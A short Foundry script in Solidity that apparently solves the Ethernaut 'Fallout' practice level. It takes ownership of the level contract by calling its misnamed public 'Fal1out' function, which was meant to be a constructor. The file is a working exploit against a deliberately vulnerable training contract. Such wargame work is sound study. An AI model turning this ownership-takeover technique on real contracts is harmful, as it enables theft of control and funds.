// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "../levels/2-Fallout.sol";
import "forge-std/Script.sol";

contract Attack is Script {
    Fallout fallout = Fallout(0x294D530705EcDF179fA14b27eAad1dCB634AB5Fe);

    function run() external{
        vm.startBroadcast();

        // Call Fal1out function to claim ownership
        fallout.Fal1out();

        vm.stopBroadcast();
    }
}